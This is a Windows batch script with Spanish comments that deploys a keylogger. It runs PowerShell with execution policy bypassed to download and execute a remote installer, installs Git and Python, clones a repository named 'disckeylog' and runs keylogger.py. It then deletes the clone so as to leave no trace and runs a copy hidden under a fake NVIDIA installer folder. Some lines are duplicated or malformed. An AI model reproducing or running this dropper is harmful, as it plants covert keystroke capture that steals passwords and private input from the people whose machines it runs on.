@echo off

:start
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"
goto check01

::check si git esta instalado
:check01
where git > nul 2>&1
if %errorlevel% neq 0 (
    echo "Git is not installed."
    goto gitinstall
    
) else (
    echo "Git is installed."
    goto check02
)
::instala git

:gitinstall
echo "Installing Git..."
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString(‘https://community.chocolatey.org/install.ps1’))
choco install git.install
goto check01

:: checkea si python esta instalado
:check02
python --version 3>NUL
if errorlevel 1 goto errorNoPython
goto clone

::Instala python
:errorNoPython
echo Installing Python...
choco install -y python3
goto check02

:: clona el repositorio de github
:clone
git clone https://github.com/Zer0plusOne/disckeylog

::Abre el directorio clonado
cd disckeylog

::Ejecuta el script
python3 keylogger.py

::Timeout
timeout /t 180

::elimina el repositorio para no dejar huella
cd ..
timeout /t 5
rmdir /s /q disckeylog
timeout /t 15

::abre la carpeta donde se encuentra la copia generada por el propio script
cd C:\Program Files\NVIDIA Corporation\Installer2\installer
::ejecuta el nuevo script
python3 keylogger.py

::fin de tu trabajo .bat, lo hiciste bien
exit
python3 keylogger.py

::fin de tu trabajo .bat, lo hiciste bien
exit
